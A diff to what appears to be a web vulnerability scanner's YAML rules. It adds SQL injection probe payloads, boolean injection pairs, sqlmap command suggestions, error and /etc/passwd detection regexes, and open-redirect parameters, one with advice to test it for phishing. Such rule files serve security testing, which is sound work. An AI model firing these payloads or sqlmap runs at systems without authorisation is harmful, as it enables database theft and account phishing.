@@ -1,13 +1,13 @@
 sqli_error:
-  params: [id, pid, cat, item, page]
+  params: [id, pid, cat, item, page, q]
   advice: 'sqlmap -u "URL" -p PARAM --batch --dbs'
-  payloads: ["'", "\"", "1'", "1'-- -", "' OR '1'='1"]
+  payloads: ["'", "\"", "1'", "1'-- -", "' OR '1'='1", "test') OR 1=1--"]
   signals:
-    - {type: regex, pattern: 'SQL syntax|mysql_fetch|SQLSTATE|ORA-0\d{4}|Unclosed quotation|syntax error near|Warning.{0,20}mysqli?'}
+    - {type: regex, pattern: 'SQL syntax|SQLITE_ERROR|sqlite|near|mysql_fetch|SQLSTATE|ORA-0\d{4}|Unclosed quotation|syntax error near|Warning.{0,20}mysqli?'}
     - {type: length_delta, pct: 15}
     - {type: status_change}
 sqli_bool:
-  params: [id, pid, cat]
+  params: [id, pid, cat, q]
   advice: 'sqlmap -u "URL" -p PARAM --batch --technique=B'
   pairs: [["1 and 1=1", "1 and 1=2"], ["1' and '1'='1", "1' and '1'='2"]]
   signals:
@@ -19,7 +19,7 @@ lfi:
   signals:
     - {type: regex, pattern: 'root:x:0:0|daemon:x:|\[fonts\]|PD9waHA'}
 open_redirect:
-  params: [url, redirect, next, return, target, callback, dest]
+  params: [url, redirect, next, return, target, callback, dest, to]
   advice: 'OAuth/SSO flow mein is param ko phishing ke liye test karein'
   payloads: ["https://example.com/dorklens", "//example.com/dorklens"]
   signals:
